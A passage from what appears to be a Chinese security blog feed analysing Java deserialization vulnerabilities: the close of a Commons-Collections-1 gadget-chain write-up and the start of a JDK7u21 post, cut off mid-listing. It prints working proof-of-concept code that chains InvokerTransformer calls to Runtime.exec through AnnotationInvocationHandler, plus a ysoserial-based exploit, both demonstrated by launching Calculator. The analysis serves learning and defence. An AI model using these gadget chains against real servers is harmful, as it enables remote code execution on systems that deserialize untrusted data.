寻找readObject复写点</h2><p>上面的PoC还是有点别扭，需要服务端配合将反序列化内容反序列化为map，并对值进行修改。</p><p>在jdk1.7中就存在一个完美的readobject复写点的类<code>sun.reflect.annotation.AnnotationInvocationHandler</code>。<br>看他的构造函数：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">AnnotationInvocationHandler(Class&lt;? extends Annotation&gt; var1, Map&lt;String, Object&gt; var2) &#123;</span><br><span class="line">    Class[] var3 = var1.getInterfaces();</span><br><span class="line">    <span class="keyword">if</span> (var1.isAnnotation() &amp;&amp; var3.length == <span class="number">1</span> &amp;&amp; var3[<span class="number">0</span>] == Annotation<span class="class">.<span class="keyword">class</span>) </span>&#123;<span class="comment">//var1满足这个if条件时</span></span><br><span class="line">        <span class="keyword">this</span>.type = var1;<span class="comment">//传入的var1到this.type</span></span><br><span class="line">        <span class="keyword">this</span>.memberValues = var2;<span class="comment">//我们的map传入this.memberValues</span></span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> AnnotationFormatError(<span class="string">"Attempt to create proxy for a non-annotation type."</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>readObject复写函数：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">readObject</span><span class="params">(ObjectInputStream var1)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException </span>&#123;</span><br><span class="line">        <span class="comment">//默认反序列化,这里是前半部分代码</span></span><br><span class="line">        var1.defaultReadObject();</span><br><span class="line">        AnnotationType var2 = <span class="keyword">null</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">//这里的this.type是我们在实例化的时候传入的jdk自带的Target.class</span></span><br><span class="line">            <span class="comment">//之前的poc语句是这样Object instance = ctor.newInstance(Target.class, outerMap);</span></span><br><span class="line">            var2 = AnnotationType.getInstance(<span class="keyword">this</span>.type);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IllegalArgumentException var9) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> InvalidObjectException(<span class="string">"Non-annotation type in annotation serial stream"</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        Map var3 = var2.memberTypes();<span class="comment">//</span></span><br><span class="line">        Iterator var4 = <span class="keyword">this</span>.memberValues.entrySet().iterator();<span class="comment">//获取我们构造map的迭代器</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span>(var4.hasNext()) &#123;</span><br><span class="line">            Entry var5 = (Entry)var4.next();<span class="comment">//遍历map迭代器</span></span><br><span class="line">            String var6 = (String)var5.getKey();<span class="comment">//获取key的名称</span></span><br><span class="line">            Class var7 = (Class)var3.get(var6);<span class="comment">//获取var2中相应key的class类？这边具体var3是什么个含义不太懂，但是肯定var7、8两者不一样</span></span><br><span class="line">            <span class="keyword">if</span> (var7 != <span class="keyword">null</span>) &#123;</span><br><span class="line">                Object var8 = var5.getValue();<span class="comment">//获取map的value</span></span><br><span class="line">                <span class="keyword">if</span> (!var7.isInstance(var8) &amp;&amp; !(var8 <span class="keyword">instanceof</span> ExceptionProxy)) &#123;</span><br><span class="line">                    <span class="comment">//两者类型不一致，给var5赋值！！具体赋值什么已经不关键了！只要赋值了就代表执行命令成功</span></span><br><span class="line">                    var5.setValue((<span class="keyword">new</span> AnnotationTypeMismatchExceptionProxy(var8.getClass() + <span class="string">"["</span> + var8 + <span class="string">"]"</span>)).setMember((Method)var2.members().get(var6)));</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>虽然相对于这个类具体做什么，实在是没有精力去搞清楚了，但是它最终对于我们传入构造函数的map进行遍历赋值。<br>这样就弥补了我们之前反序列化需要服务端存在一些条件的不足，形成完美反序列化攻击。</p><p>最终模拟攻击代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">    <span class="comment">//1.客户端构建攻击代码</span></span><br><span class="line">    <span class="comment">//此处构建了一个transformers的数组，在其中构建了任意函数执行的核心代码</span></span><br><span class="line">    Transformer[] transformers = <span class="keyword">new</span> Transformer[] &#123;</span><br><span class="line">            <span class="keyword">new</span> ConstantTransformer(Runtime<span class="class">.<span class="keyword">class</span>),</span></span><br><span class="line">            new InvokerTransformer("getMethod", new Class[] &#123;String.class, Class[].class &#125;, new Object[] &#123;"getRuntime", new Class[0] &#125;),</span><br><span class="line">            new InvokerTransformer("invoke", new Class[] &#123;Object.class, Object[].class &#125;, new Object[] &#123;null, new Object[0] &#125;),</span><br><span class="line">            new InvokerTransformer("exec", new Class[] &#123;String.class &#125;, new Object[] &#123;"/Applications/Calculator.app/Contents/MacOS/Calculator"&#125;)</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="comment">//将transformers数组存入ChaniedTransformer这个继承类</span></span><br><span class="line">    Transformer transformerChain = <span class="keyword">new</span> ChainedTransformer(transformers);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//创建Map并绑定transformerChina</span></span><br><span class="line">    Map innerMap = <span class="keyword">new</span> HashMap();</span><br><span class="line">    innerMap.put(<span class="string">"value"</span>, <span class="string">"value"</span>);</span><br><span class="line">    <span class="comment">//给予map数据转化链</span></span><br><span class="line">    Map outerMap = TransformedMap.decorate(innerMap, <span class="keyword">null</span>, transformerChain);</span><br><span class="line">    <span class="comment">//反射机制调用AnnotationInvocationHandler类的构造函数</span></span><br><span class="line">    Class cl = Class.forName(<span class="string">"sun.reflect.annotation.AnnotationInvocationHandler"</span>);</span><br><span class="line">    Constructor ctor = cl.getDeclaredConstructor(Class<span class="class">.<span class="keyword">class</span>, <span class="title">Map</span>.<span class="title">class</span>)</span>;</span><br><span class="line">    <span class="comment">//取消构造函数修饰符限制</span></span><br><span class="line">    ctor.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">    <span class="comment">//获取AnnotationInvocationHandler类实例</span></span><br><span class="line">    Object instance = ctor.newInstance(Target<span class="class">.<span class="keyword">class</span>, <span class="title">outerMap</span>)</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//payload序列化写入文件，模拟网络传输</span></span><br><span class="line">    FileOutputStream f = <span class="keyword">new</span> FileOutputStream(<span class="string">"payload.bin"</span>);</span><br><span class="line">    ObjectOutputStream fout = <span class="keyword">new</span> ObjectOutputStream(f);</span><br><span class="line">    fout.writeObject(instance);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//2.服务端读取文件，反序列化，模拟网络传输</span></span><br><span class="line">    FileInputStream fi = <span class="keyword">new</span> FileInputStream(<span class="string">"payload.bin"</span>);</span><br><span class="line">    ObjectInputStream fin = <span class="keyword">new</span> ObjectInputStream(fi);</span><br><span class="line">    <span class="comment">//服务端反序列化</span></span><br><span class="line">    fin.readObject();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="../images/%E3%80%90%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E3%80%91commons-collections-1%20%E7%BB%84%E4%BB%B6/image-20200914103156574.png" alt="image-20200914103156574"></p><p>至此，我们在客户端构造了payload发送至服务端，只要服务端：</p><ol><li>对我们的输入进行反序列化</li><li>jdk版本为1.7</li></ol><p>就可以直接完成命令执行，完美！</p><p>但是！！！</p><p><code>AnnotationType.getInstance(this.type)</code>是一个关键的有关注解的操作。所以我们需要先来了解一下java的注解。</p><h3 id="补充知识：注解"><a href="#补充知识：注解" class="headerlink" title="补充知识：注解"></a>补充知识：注解</h3><p><code>Target.class</code>其实是java提供的的<strong>元注解</strong>（因为是注解所以之后写成特有的形式<code>@Target</code>）。除此之外还有<code>@Retention</code>、<code>@Documented</code>、<code>@Inherited</code>，所谓<strong>元注解就是标记其他注解的注解</strong>。</p><ul><li>@Target 用来约束注解可以应用的地方（如方法、类或字段）</li><li>@Retention用来约束注解的生命周期，分别有三个值，源码级别（source），类文件级别（class）或者运行时级别（runtime)</li><li>@Documented 被修饰的注解会生成到javadoc中</li><li>@Inherited 可以让注解被继承，但这并不是真的继承，只是通过使用@Inherited，可以让子类Class对象使用getAnnotations()获取父类被@Inherited修饰的注解</li><li>除此之外注解还可以有注解元素(等同于赋值)。</li></ul><p>举个自定义注解的例子：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Target</span>(ElementType.TYPE)</span><br><span class="line"><span class="meta">@Retention</span>(RetentionPolicy.RUNTIME)</span><br><span class="line"><span class="keyword">public</span> <span class="meta">@interface</span> DBTable &#123;</span><br><span class="line">    <span class="function">String <span class="title">name</span><span class="params">()</span> <span class="keyword">default</span> ""</span>;<span class="comment">//default是默认值</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>它会被这样使用：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@DBTable</span>(name = <span class="string">"MEMBER"</span>)</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Member</span> </span>&#123;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>由于赋值的时候总是用 <code>注解元素 = 值</code>的形式太麻烦了，出现了 <code>value</code> 这个偷懒的语法糖。（这也是为什么之前的<code>@Target(ElementType.TYPE)</code>不是<code>注解元素 = 值</code>的形式）</p><p>如果注解元素为<strong>value</strong>时，就不需要用<code>注解元素 = 值</code>的形式，而是直接写入值就可以赋值为value。</p><p>除此之外java还有一些内置注解：</p><ul><li>@Override：用于标明此方法覆盖了父类的方法</li><li>@Deprecated：用于标明已经过时的方法或类</li><li>@SuppressWarnnings:用于有选择的关闭编译器对类、方法、成员变量、变量初始化的警告</li></ul><p>回过头来看看<code>java.lang.annotation.Target</code>：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Documented</span><span class="comment">//会被写入javadoc文档</span></span><br><span class="line"><span class="meta">@Retention</span>(RetentionPolicy.RUNTIME)<span class="comment">//生命周期时运行时</span></span><br><span class="line"><span class="meta">@Target</span>(ElementType.ANNOTATION_TYPE)<span class="comment">//标明注解可以用于注解声明(应用于另一个注解上)</span></span><br><span class="line"><span class="keyword">public</span> <span class="meta">@interface</span> Target &#123;</span><br><span class="line">    ElementType[] value();<span class="comment">//注解元素，一个特定的value语法糖，可以省点力气</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>初步了解了java的注解之后，我们回来看<code>AnnotationType.getInstance(this.type)</code>对@Target这个注解的处理，不过多的去纠结内部细节，var2=getInstance会获取到@Target的基本信息，包括注解元素，注解元素的默认值，生命周期，是否继承等等。</p><p><img src="../images/%E3%80%90%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E3%80%91commons-collections-1%20%E7%BB%84%E4%BB%B6/image-20200914105649446.png" alt="image-20200914105649446"></p><p>var3就是一个注解元素的键值对value这个注解元素，可以取值<code>Ljava.lang.annotation.ElementType</code>类型的值。</p><p><img src="../images/%E3%80%90%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E3%80%91commons-collections-1%20%E7%BB%84%E4%BB%B6/image-20200914105816178.png" alt="image-20200914105816178"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//后半部分代码</span></span><br><span class="line">        Map var3 = var2.memberTypes();<span class="comment">//&#123;value：ElementType的键值对&#125;</span></span><br><span class="line">        Iterator var4 = <span class="keyword">this</span>.memberValues.entrySet().iterator();</span><br><span class="line">        <span class="comment">//获取我们构造map的迭代器，无法命令执行的键值对是&#123;key:value&#125;</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span>(var4.hasNext()) &#123;</span><br><span class="line">            Entry var5 = (Entry)var4.next();<span class="comment">//获取到&#123;key:value&#125;</span></span><br><span class="line">            String var6 = (String)var5.getKey();<span class="comment">//获取键值对的键名key</span></span><br><span class="line">            Class var7 = (Class)var3.get(var6);</span><br><span class="line">            <span class="comment">//从@Target的注解元素键值对&#123;value：ElementType的键值对&#125;中去寻找键名为key的值</span></span><br><span class="line">            <span class="comment">//于是var7为空,进不到命令执行</span></span><br><span class="line">            <span class="keyword">if</span> (var7 != <span class="keyword">null</span>) &#123;</span><br><span class="line">                <span class="comment">//触发命令执行处</span></span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这样我们就搞懂了为什么赋值map{key：value}就不行，因为通过AnnotationInvocationHandler#readObject，我们需要保证：</p><ul><li>我们poc中提供的<code>this.type</code>的注解要存在注解元素名（为了满足var3不为空）。</li><li>我们poc中提供的<code>this.memberValues</code>中存在的一个键值对的键名与<code>this.type</code>的注解要存在注解元素名相等。（为了满足var7!=null）</li></ul><p>所以我们选取了@Target注解作为<code>this.type</code>，我们就必须向<code>this.memberValues</code>写入一个<code>value：xxx</code>的键值对</p><p>这里的<code>this.type</code>是可以变动的，比如换成另一个元注释<code>Retention.class</code>（虽然他的注解元素名也是value），甚至可以自定义，但是对方服务器上没有这个注释，打别人是没有用的，所以还是<strong>选用大家都有的元注释</strong>。</p><p>同时我们写入的<code>this.memberValues</code>的键名不能改变，但是值可以改变。</p><p>例如<code>innerMap.put(&quot;value&quot;,&quot;hello&quot;)</code>，也是可以的。</p><h2 id="限制点"><a href="#限制点" class="headerlink" title="限制点"></a>限制点</h2><p>8u71之前都是可以使用的，在Java 8u71之后代码发生了变动。</p><p>看一下jdk8里面的<code>sun.reflect.annotation.AnnotationInvocationHandler</code> readObject复写点：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">readObject</span><span class="params">(ObjectInputStream var1)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException </span>&#123;</span><br><span class="line">        GetField var2 = var1.readFields();</span><br><span class="line">        Class var3 = (Class)var2.get(<span class="string">"type"</span>, (Object)<span class="keyword">null</span>);</span><br><span class="line">        Map var4 = (Map)var2.get(<span class="string">"memberValues"</span>, (Object)<span class="keyword">null</span>);</span><br><span class="line">        AnnotationType var5 = <span class="keyword">null</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            var5 = AnnotationType.getInstance(var3);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IllegalArgumentException var13) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> InvalidObjectException(<span class="string">"Non-annotation type in annotation serial stream"</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        Map var6 = var5.memberTypes();</span><br><span class="line">        LinkedHashMap var7 = <span class="keyword">new</span> LinkedHashMap();</span><br><span class="line"></span><br><span class="line">        String var10;</span><br><span class="line">        Object var11;</span><br><span class="line">        <span class="keyword">for</span>(Iterator var8 = var4.entrySet().iterator(); var8.hasNext(); var7.put(var10, var11)) &#123;</span><br><span class="line">            Entry var9 = (Entry)var8.next();</span><br><span class="line">            var10 = (String)var9.getKey();</span><br><span class="line">            var11 = <span class="keyword">null</span>;</span><br><span class="line">            Class var12 = (Class)var6.get(var10);</span><br><span class="line">            <span class="keyword">if</span> (var12 != <span class="keyword">null</span>) &#123;</span><br><span class="line">                var11 = var9.getValue();</span><br><span class="line">                <span class="keyword">if</span> (!var12.isInstance(var11) &amp;&amp; !(var11 <span class="keyword">instanceof</span> ExceptionProxy)) &#123;</span><br><span class="line">                    <span class="comment">//很伤心的，没有了map赋值语句</span></span><br><span class="line">                    var11 = (<span class="keyword">new</span> AnnotationTypeMismatchExceptionProxy(var11.getClass() + <span class="string">"["</span> + var11 + <span class="string">"]"</span>)).setMember((Method)var5.members().get(var10));</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//省略...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>因为这个函数出现了变动，不再有针对构造的map的赋值语句，所以触发不了漏洞。</p><p>而是改成了新建一个LinkedHashMap，把值转进这个LinkedHashMap里面。有空之后补上。</p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>那么整个cc1链就分析结束了，从PoC角度进行一下步骤总结：</p><ol><li><p>首先<code>sun.reflect.annotation.AnnotationInvocationHandler#readObject</code>函数会将payload读取，在经过函数内部一系列的var变量解析之后，会在构造好的Map数据结构中直接setValue赋值操作。</p></li><li><p>setValue函数是<code>org.apache.commons.collections.map.AbstractInputCheckedMapDecorator.MapEntry#setValue</code>；</p><p>它内部有一个transform危险函数，这个函数会循环解析payload封装好的transformer数组。</p><p>这个transformer数组是<code>org.apache.commons.collections.functors.ChainedTransformer#iTransformers</code>；</p><p>可以看到是经过<code>ChainedTransformer</code>数据结构封装好的</p></li><li><p>在构造map对象的时候，我们通过decorate函数<code>org.apache.commons.collections.map.TransformedMap#decorate</code>，将我们的transformer数组，也就是恶意转换链配置好，一旦出现map赋值操作，他就会自动解析我们的恶意转换链，触发漏洞。</p></li></ol><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a href="https://xz.aliyun.com/t/7031" target="_blank" rel="noopener">1</a></p><p><a href="http://blog.orleven.com/2017/11/11/java-deserialize/" target="_blank" rel="noopener">2</a></p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;序言&quot;&gt;&lt;a href=&quot;#序言&quot; class=&quot;headerlink&quot; title=&quot;序言&quot;&gt;&lt;/a&gt;序言&lt;/h1&gt;&lt;blockquote&gt;
&lt;p&gt;往事依稀浑似梦，都随风雨到心头。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;今天来看经典漏洞CC链，害，经典还债环节。&lt;/p&gt;
    
    </summary>
    
    
      <category term="Java" scheme="https://0range228.github.io/categories/Java/"/>
    
    
      <category term="漏洞分析" scheme="https://0range228.github.io/tags/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    
  </entry>
  
  <entry>
    <title>【反序列化漏洞】JDK7u21</title>
    <link href="https://0range228.github.io/%E3%80%90%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E3%80%91JDK7u21/"/>
    <id>https://0range228.github.io/%E3%80%90%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E3%80%91JDK7u21/</id>
    <published>2020-09-08T01:58:22.000Z</published>
    <updated>2020-09-11T02:30:51.849Z</updated>
    
    <content type="html"><![CDATA[<h1 id="序言"><a href="#序言" class="headerlink" title="序言"></a>序言</h1><blockquote><p>往事依稀浑似梦，都随风雨到心头。</p></blockquote><p>终于开学了，疯狂更博启动。</p><a id="more"></a><h1 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h1><p>JDK–JRE</p><p>​        -tools:javac,…</p><p>​        -lib</p><p>​        -cmd:jar</p><p>查看系统已安装的Java版本和路径：<code>/usr/libexec/java_home -V</code></p><p><a href="https://www.oracle.com/java/technologies/javase/javase7-archive-downloads.html" target="_blank" rel="noopener">Java se 7的所有版本</a></p><p>存在缺陷版本：JRE -V &lt;= 7u21</p><p>需要<a href="https://github.com/frohoff/ysoserial" target="_blank" rel="noopener">ysoserial</a>的搭配</p><h1 id="漏洞演示"><a href="#漏洞演示" class="headerlink" title="漏洞演示"></a>漏洞演示</h1><h1 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h1><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> ysoserial.payloads.Jdk7u21;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@program</span>: 7u21</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@description</span>:</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span>: 0range</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@create</span>: 2020-09-07 16:02</span></span><br><span class="line"><span class="comment"> **/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">JDK7u21Test</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Object calc = <span class="keyword">new</span> Jdk7u21().getObject(<span class="string">"open /Applications/Calculator.app/Contents/MacOS/Calculator"</span>);</span><br><span class="line"></span><br><span class="line">            ByteArrayOutputStream byteArrayOutputStream = <span class="keyword">new</span> ByteArrayOutputStream();<span class="comment">//用于存放person对象序列化byte数组的输出流</span></span><br><span class="line"></span><br><span class="line">            ObjectOutputStream objectOutputStream = <span class="keyword">new</span> ObjectOutputStream(byteArrayOutputStream);</span><br><span class="line">            objectOutputStream.writeObject(calc);<span class="comment">//序列化对象</span></span><br><span class="line">            objectOutputStream.flush();</span><br><span class="line">            objectOutputStream.close();</span><br><span class="line"></span><br><span class="line">            <span class="keyword">byte</span>[] bytes = byteArrayOutputStream.toByteArray();<span class="comment">//读取序列化后的对象byte数组</span></span><br><span class="line"></span><br><span class="line">            ByteArrayInputStream byteArrayInputStream = <span class="keyword">new</span> ByteArrayInputStream(bytes);<span class="comment">//存放byte数组的输入流</span></span><br><span class="line"></span><br><span class="line">            ObjectInputStream objectInputStream = <span class="keyword">new</span> ObjectInputStream(byteArrayInputStream);</span><br><span class="line">            Object o = objectInputStream.readObject();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>执行结果：</p><p><img src="../images/JDK7u21%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20200908103017752.png" alt="image-20200908103017752"></p><p>跟进看ysoserial部分的payload：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> ysoserial.payloads;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.LinkedHashSet;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.Templates;</span><br><span 